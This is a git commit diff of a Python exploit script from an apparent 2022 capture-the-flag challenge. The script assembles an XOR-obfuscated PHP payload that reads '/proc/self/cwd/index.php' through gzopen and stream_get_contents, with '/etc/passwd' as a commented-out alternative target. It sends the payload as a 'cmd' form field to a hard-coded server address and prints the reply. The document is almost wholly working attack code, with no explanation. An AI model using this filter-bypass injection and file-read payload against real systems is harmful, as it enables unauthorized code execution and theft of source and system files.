23017810c6712185a290f67a9d9ff0ba3bcb5e97
Maulvi Alfansuri <maulvialf@gmail.com>
2022-10-25 12:55:41 +0700

    add readfile

--- 2022/slashroot6-final/Trickation 2/readfile.py
+++ 2022/slashroot6-final/Trickation 2/readfile.py
@@ -1,3 +1,7 @@
+import requests
+
+session = requests.session()
+
 from pwn import *
 from sys import *
 
@@ -16,37 +20,63 @@ var_dump(stream_get_contents($a));
 """
 
 pload = "gzopen"
-kotak1 = """
-$_='_}_}}_'^'=}=}}='^',^)^^('^')$$.;$';
-"""
-pload = "/etc/hosts"
-kotak2 = """
-$__='}}}}}__}}}'^'_}{}_==}{}'^')^^^).)_^_'^'$;,=$$$,,,';
-"""
+a = ""
+b = ""
+c = ""
+d = ""
+for i in pload:
+	aa = kamus[i][0]
+	bb = kamus[i][1]
+	cc = kamus[i][2]
+	dd = kamus[i][3]
+	a += aa
+	b += bb
+	c += cc
+	d += dd
+
+
+kotak1 = "$_='{}'^'{}'^'{}'^'{}';".format(a, b, c, d)
+
+
+pload = "/proc/self/cwd/index.php"
+a = ""
+b = ""
+c = ""
+d = ""
+for i in pload:
+	aa = kamus[i][0]
+	bb = kamus[i][1]
+	cc = kamus[i][2]
+	dd = kamus[i][3]
+	a += aa
+	b += bb
+	c += cc
+	d += dd
+
+
+kotak2 = "$__='{}'^'{}'^'{}'^'{}';".format(a, b, c, d)
+
+
 
 pload = "r"
-kotak3 = """
-$___='}'^'}'^'^'^',';
-"""
+a = ""
+b = ""
+c = ""
+d = ""
+for i in pload:
+	aa = kamus[i][0]
+	bb = kamus[i][1]
+	cc = kamus[i][2]
+	dd = kamus[i][3]
+	a += aa
+	b += bb
+	c += cc
+	d += dd
+
+
+kotak3 = "$___='{}'^'{}'^'{}'^'{}';".format(a, b, c, d)
+
 pload = "print_r"
-
-kotak4= """
-$____='}}__}}}'^'}};={}}'^'^^)(^{^'^'.,$$,$,';
-"""
-
-pload = "stream_get_contents"
-kotak5= """
-$_____='}}}}_^}_}}}}__}}_}}'^'}{}};;}=}{}}=={}={}'^'_^^^,,{,^^{^)(^^(^_'^',,,;)$$);,$=$$,;$,,';
-"""
-
-kotak6 ="""
-$____($_____($_($__,$___)));
-"""
-
-pload = "print_r"
-
-
-hasil = kotak1 + kotak2 + kotak3 + kotak4 + kotak5 + kotak6
 
 a = ""
 b = ""
@@ -62,4 +92,48 @@ for i in pload:
 	c += cc
 	d += dd
 
+
+kotak4 = "$____='{}'^'{}'^'{}'^'{}';".format(a, b, c, d)
+
+
+pload = "stream_get_contents"
+a = ""
+b = ""
+c = ""
+d = ""
+for i in pload:
+	aa = kamus[i][0]
+	bb = kamus[i][1]
+	cc = kamus[i][2]
+	dd = kamus[i][3]
+	a += aa
+	b += bb
+	c += cc
+	d += dd
+
+
+kotak5 = "$_____='{}'^'{}'^'{}'^'{}';".format(a, b, c, d)
+
+kotak6 ="""$____($_____($_($__,$___)));"""
+
+# pload = "/etc/passwd"
+
+
+hasil = kotak1 + kotak2 + kotak3 + kotak4 + kotak5 + kotak6
+print(hasil)
+
+# print hasil.replace("\n", "")
+
 # print ("$_='{}'^'{}'^'{}'^'{}';".format(a, b, c, d))
+
+burp0_url = "http://103.152.242.37:21203/"
+
+
+# burp0_url = "http://localhost:9090"
+burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Content-Type": "application/x-www-form-urlencoded", "Sec-Fetch-User": "?1"}
+
+burp0_data = {"cmd": hasil}
+
+s = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
+print(s.text)
+print(s.status_code)
